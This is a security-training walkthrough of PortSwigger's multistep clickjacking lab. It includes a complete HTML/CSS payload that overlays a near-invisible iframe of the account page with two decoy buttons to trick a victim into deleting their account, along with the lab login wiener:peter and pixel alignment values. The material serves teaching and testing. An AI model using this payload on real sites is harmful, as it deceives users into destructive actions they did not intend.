## Multistep clickjacking

**Category:** clickjacking
**Difficulty:** Unknown

### Description
This lab has some account functionality that is protected by a CSRF token and also has a confirmation dialog to protect against Clickjacking. To solve this lab construct an attack that fools the user into clicking the delete account button and the confirmation dialog by clicking on "Click me first" and "Click me next" decoy actions. You will need to use two elements for this lab.

### Solution Steps
1. Log in to your account on the target website and go to the user account page.
2. Go to the exploit server and paste the following HTML template into the "Body" section: <style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
   .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
3. Make the following adjustments to the template: Replace YOUR-LAB-ID with your unique lab ID so that URL points to the target website's user account page. Substitute suitable pixel values for the $width_value and $height_value variables of the iframe (we suggest 500px and 700px respectively). Substitute suitable pixel values for the $top_value1 and $side_value1 variables of the decoy web content so that the "Delete account" button and the "Test me first" decoy action align (we suggest 330px and 50px respectively). Substitute a suitable value for the $top_value2 and $side_value2 variables so that the "Test me next" decoy action aligns with the "Yes" button on the confirmation page (we suggest 285px and 225px respectively). Set the opacity value $opacity to ensure that the target iframe is transparent. Initially, use an opacity of 0.1 so that you can align the iframe actions and adjust the position values as necessary. For the submitted attack a value of 0.0001 will work.
4. Click Store and then View exploit .
5. Hover over "Test me first" and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties inside the firstClick class of the style sheet.
6. Click Test me first then hover over Test me next and ensure the cursor changes to a hand indicating that the div element is positioned correctly. If not, adjust the position of the div element by modifying the top and left properties inside the secondClick class of the style sheet.
7. Once you have the div element lined up correctly, change "Test me first" to "Click me first", "Test me next" to "Click me next" and click Store on the exploit server.
8. Now click on Deliver exploit to victim and the lab should be solved.

### Key Payloads
- `wiener:peter`
- `<style>
	iframe {
		position:relative;
		width:$width_value;
		height: $height_value;
		opacity: $opacity;
		z-index: 2;
	}
   .firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index: 1;
	}
   .secondClick {
		top:$top_value2;
		left:$side_value2;
	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>`
- `YOUR-LAB-ID`
- `$width_value`
- `$height_value`
- `$top_value1`
- `$side_value1`
- `$top_value2`
- `$side_value2`
- `$opacity`

### Indicators of Success
- Check for changes in application behavior
- Look for error messages or data exposure
- Verify the vulnerability type: clickjacking

---
*Source: PortSwigger Web Security Academy*
